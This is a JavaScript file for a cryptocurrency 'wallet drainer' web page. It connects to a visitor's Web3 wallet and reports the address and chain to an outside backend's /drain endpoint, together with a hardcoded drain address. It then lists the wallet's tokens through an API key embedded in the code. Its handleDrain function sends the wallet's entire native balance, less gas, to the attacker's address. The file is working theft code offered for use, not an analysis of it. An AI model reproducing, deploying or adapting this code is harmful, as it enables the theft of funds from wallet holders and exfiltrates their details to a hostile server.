// CONFIGURATION
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// GLOBAL STATE
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM ELEMENTS
let connectBtn, statusEl, tokensEl, drainBtn, networkSelect;

// INITIALIZE APP
document.addEventListener('DOMContentLoaded', initializeApp);

function initializeApp() {
    console.log('🔄 Initializing app...');
    
    // Get DOM elements
    connectBtn = document.getElementById("connectBtn");
    statusEl = document.getElementById("status");
    tokensEl = document.getElementById("tokens");
    drainBtn = document.getElementById("drainBtn");
    networkSelect = document.getElementById("networkSelect");
    
    if (!connectBtn) {
        console.error('❌ Connect button not found!');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (networkSelect) networkSelect.onchange = handleNetworkChange;
    
    // Check for existing connection
    checkExistingConnection();
    
    console.log('✅ App initialized');
    updateStatus('Click "Connect Wallet" to begin');
}

// CHECK FOR EXISTING WALLET CONNECTION
async function checkExistingConnection() {
    if (typeof window.ethereum === 'undefined') {
        return;
    }
    
    try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        
        if (accounts.length > 0) {
            const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️ No existing connection');
    }
}

// HANDLE CONNECT BUTTON CLICK
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    // Check if MetaMask/ethereum provider exists
    if (typeof window.ethereum === 'undefined') {
        updateStatus('❌ Please install MetaMask or a Web3 wallet');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request account access
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
        const chainId = parseInt(chainIdHex, 16);
        
        console.log('✅ Connected:', accounts[0], 'Chain:', chainId);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected by user');
        } else {
            updateStatus('❌ Connection failed: ' + error.message);
        }
    }
}

// HANDLE SUCCESSFUL CONNECTION
async function handleConnected(account, chainId) {
    try {
        // Setup provider
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        }
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
        // Setup wallet listeners
        setupWalletListeners();
        
    } catch (error) {
        console.error('❌ Connection setup error:', error);
        updateStatus('Connection setup failed: ' + error.message);
    }
}

// SETUP WALLET EVENT LISTENERS
function setupWalletListeners() {
    if (typeof window.ethereum === 'undefined') return;
    
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    window.ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed to: ${chainName}`);
        
        if (networkSelect) {
            networkSelect.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
}

// DISCONNECT WALLET
async function disconnectWallet() {
    try {
        if (window.ethereum && window.ethereum.disconnect) {
            await window.ethereum.disconnect();
        }
    } catch (error) {
        console.log('⚠️ Disconnect error:', error);
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    }
    
    updateStatus('Disconnected');
    hideUIElements();
    
    if (tokensEl) tokensEl.innerHTML = '';
}

// SHOW WALLET INSTALL GUIDE
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 15px; background: #f0f0f0; border-radius: 8px;">
            <h4 style="margin-top: 0;">No Wallet Detected</h4>
            <p>Please install one of these wallets:</p>
            <ul style="list-style: none; padding: 0;">
                <li style="margin: 5px 0;">
                    <a href="https://metamask.io/download/" target="_blank" 
                       style="color: #f6851b; text-decoration: none;">🔵 MetaMask</a>
                </li>
                <li style="margin: 5px 0;">
                    <a href="https://trustwallet.com/" target="_blank"
                       style="color: #3375bb; text-decoration: none;">🔶 Trust Wallet</a>
                </li>
                <li style="margin: 5px 0;">
                    <a href="https://wallet.coinbase.com/" target="_blank"
                       style="color: #0052ff; text-decoration: none;">🔷 Coinbase Wallet</a>
                </li>
            </ul>
            <p><small>After installing, refresh this page.</small></p>
        </div>
    `;
    
    if (statusEl) {
        statusEl.innerHTML = guideHTML;
    }
}

// UPDATE STATUS
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// SHOW UI ELEMENTS
function showUIElements() {
    const elements = document.querySelectorAll('.hidden');
    elements.forEach(el => {
        if (el.id !== 'connectBtn') {
            el.classList.remove('hidden');
        }
    });
}

// HIDE UI ELEMENTS
function hideUIElements() {
    const elementsToHide = ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'];
    elementsToHide.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// LOG CONNECTION TO BACKEND
async function logConnectionToBackend(address, chainId) {
    try {
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            })
        });
        
        if (response.ok) {
            console.log('✅ Logged to backend');
        }
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// FETCH TOKENS
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) throw new Error('API error');
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount,
                    value: value,
                    formattedAmount: amount.toFixed(6),
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A'
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// DISPLAY TOKENS
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount}</div>
                ${token.value > 0 ? `<div class="token-value">${token.formattedValue}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
}

// HANDLE DRAIN
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (!confirm(`⚠️ Send ALL tokens to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting drain...');
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}`);
            
            await tx.wait();
            updateStatus('✅ Drain completed!');
            
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus('⚠️ Not enough ETH for gas');
        }
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain Wallet';
        }
    }
}

// HANDLE NETWORK CHANGE
async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId || !isConnected) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching network...`);
        
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${newChainId.toString(16)}` }]
        });
        
    } catch (error) {
        console.error('❌ Network switch error:', error);
        updateStatus(`❌ Failed to switch network`);
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

// DEBUG INFO
console.log('=== App Info ===');
console.log('Ethers available:', typeof ethers !== 'undefined');
console.log('Ethereum provider:', typeof window.ethereum !== 'undefined');
console.log('================');
